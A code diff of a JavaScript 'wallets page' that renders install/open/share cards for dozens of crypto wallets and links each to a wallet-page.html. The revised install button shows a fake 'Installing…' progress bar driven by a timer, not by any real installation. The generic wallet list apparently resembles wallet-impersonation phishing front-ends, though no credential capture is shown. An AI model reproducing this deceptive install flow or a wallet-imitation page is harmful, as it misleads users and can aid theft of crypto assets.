@@ -1,47 +1,41 @@
 console.log("Wallets page loaded!");
 
-// Final clean wallet list (no duplicates)
+// Final clean wallet list
 const wallets = [
-  "Meta Mask", "Poloniex", "Trust", "Solflare", "WalletConnect", "Terra", "Bitpay",
-  "Maiar", "MyKey", "Atwallet", "Authereum", "Bitfrost", "Coinbase1", "Coinomi",
-  "Dcent", "Easypocket", "Ledger", "Coolwallet", "Cybavowallet", "Coin98",
-  "Harmony", "PeakDefi", "Gridplus", "VIA", "Imtoken", "Infinito", "Infinity",
-  "Kadachain", "Keplr", "Midas1", "Marixwallet", "Midas2", "Nash", "Onto",
-  "Ownbit", "Pillar", "Rainbow", "Safepal", "Sollet", "Spark", "Spatium",
-  "Tokenary", "Tokenpocket", "Tomo", "Torus", "Coinbase2", "XDC", "Walletio",
-  "Walleth", "Zelcore", "Phantom", "Exodus", "Binance", "Bitget", "Other Wallets",
+  "Meta Mask","Poloniex","Trust","Solflare","WalletConnect","Terra","Bitpay","Maiar","MyKey",
+  "Atwallet","Authereum","Bitfrost","Coinbase1","Coinomi","Dcent","Easypocket","Ledger",
+  "Coolwallet","Cybavowallet","Coin98","Harmony","PeakDefi","Gridplus","VIA","Imtoken",
+  "Infinito","Infinity","Kadachain","Keplr","Midas1","Marixwallet","Midas2","Nash","Onto",
+  "Ownbit","Pillar","Rainbow","Safepal","Sollet","Spark","Spatium","Tokenary","Tokenpocket",
+  "Tomo","Torus","Coinbase2","XDC","Walletio","Walleth","Zelcore","Phantom","Exodus","Binance",
+  "Bitget","Other Wallets",
 ];
 
 const container = document.getElementById("walletContainer");
 
-// Generate cards
+// Generate wallet cards
 wallets.forEach((name) => {
   let imageName =
-    name
-      .toLowerCase()
+    name.toLowerCase()
       .replace(/\s+/g, "")
       .replace(/'/g, "")
       .replace(/\./g, "")
       .replace(/-/g, "")
       .replace(/\//g, "") + ".webp";
 
-  // Special card
   if (name.toLowerCase().includes("other")) {
     container.innerHTML += `
       <div class="wallet-card">
         <p>${name}</p>
         <div class="icon-row">
           <div class="icon-btn download-btn" onclick="installWallet('${name}')">
-              <img src="assets/icons/downloads.png">
-              <span>Install Wallet</span>
+            <img src="assets/icons/downloads.png"><span>Install Wallet</span>
           </div>
           <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
-              <img src="assets/icons/rocket.png">
-              <span>Open Wallet</span>
+            <img src="assets/icons/rocket.png"><span>Open Wallet</span>
           </div>
           <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
-              <img src="assets/icons/share.png">
-              <span>Share</span>
+            <img src="assets/icons/share.png"><span>Share</span>
           </div>
         </div>
       </div>
@@ -49,40 +43,30 @@ wallets.forEach((name) => {
     return;
   }
 
-  // Normal card
   container.innerHTML += `
     <div class="wallet-card">
-      <img src="wallet-icons/${imageName}" alt="${name}">
+      <img src="wallet-icons/${imageName}">
       <p>${name}</p>
-
       <div class="icon-row">
         <div class="icon-btn download-btn" onclick="installWallet('${name}')">
-            <img src="assets/icons/downloads.png">
-            <span>Install Wallet</span>
+          <img src="assets/icons/downloads.png"><span>Install Wallet</span>
         </div>
-
         <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
-            <img src="assets/icons/rocket.png">
-            <span>Open Wallet</span>
+          <img src="assets/icons/rocket.png"><span>Open Wallet</span>
         </div>
-
         <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
-            <img src="assets/icons/share.png">
-            <span>Share</span>
+          <img src="assets/icons/share.png"><span>Share</span>
         </div>
       </div>
     </div>
   `;
 });
 
-// Open wallet
 function openWallet(walletName) {
   window.location.href = `wallet-page.html?wallet=${walletName}`;
 }
 
-/* ---------------------------
-   SHARE WALLET
------------------------------ */
+// Share Wallet
 function shareWallet(walletName) {
   if (navigator.share) {
     navigator.share({
@@ -91,25 +75,30 @@ function shareWallet(walletName) {
       url: window.location.href,
     }).catch(() => {});
   } else {
-    alert("Sharing is not supported.");
+    alert("Sharing not supported.");
   }
 }
 
-/* ---------------------------
-   PWA INSTALL LOGIC
------------------------------ */
+/* ===============================
+   PWA INSTALL HANDLING
+================================*/
 let deferredPrompt = null;
 
-// Capture install event
 window.addEventListener("beforeinstallprompt", (e) => {
   e.preventDefault();
   deferredPrompt = e;
-  console.log("Install event saved");
 });
 
-/* ---------------------------
+/* ===============================
+   PROGRESS POPUP (OLD POPUP)
+================================*/
+function closePopup() {
+  document.getElementById("pwaPopup").style.display = "none";
+}
+
+/* ===============================
    NEW INSTALL POPUP
------------------------------ */
+================================*/
 function openInstallPopup() {
   document.getElementById("installPopup").style.display = "flex";
 }
@@ -118,7 +107,7 @@ function closeInstallPopup() {
   document.getElementById("installPopup").style.display = "none";
 }
 
-// Install from popup
+// "Install Now" button inside NEW popup
 document.getElementById("confirmInstallBtn").onclick = async () => {
   if (deferredPrompt) {
     deferredPrompt.prompt();
@@ -130,15 +119,38 @@ document.getElementById("confirmInstallBtn").onclick = async () => {
   }
 };
 
-/* ---------------------------
-   MAIN LOGIC FOR INSTALL
------------------------------ */
+/* ===============================
+   MAIN INSTALL BUTTON LOGIC
+================================*/
 function installWallet(walletName) {
   if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
     alert("Install only works on mobile.");
     return;
   }
 
-  // Open NEW popup (not the old one)
-  openInstallPopup();
+  // Show progress popup
+  let progress = 0;
+  document.getElementById("pwaPopup").style.display = "flex";
+
+  document.getElementById("progressText").innerText = "Installing… 0%";
+  document.getElementById("progressFill").style.width = "0%";
+
+  let interval = setInterval(() => {
+    progress++;
+    document.getElementById("progressText").innerText = `Installing… ${progress}%`;
+    document.getElementById("progressFill").style.width = progress + "%";
+
+    if (progress >= 100) {
+      clearInterval(interval);
+
+      // Complete
+      document.getElementById("progressText").innerText = "Done!";
+      document.getElementById("progressFill").style.width = "100%";
+
+      setTimeout(() => {
+        closePopup();       // close progress popup
+        openInstallPopup(); // open NEW popup
+      }, 700);
+    }
+  }, 40);
 }
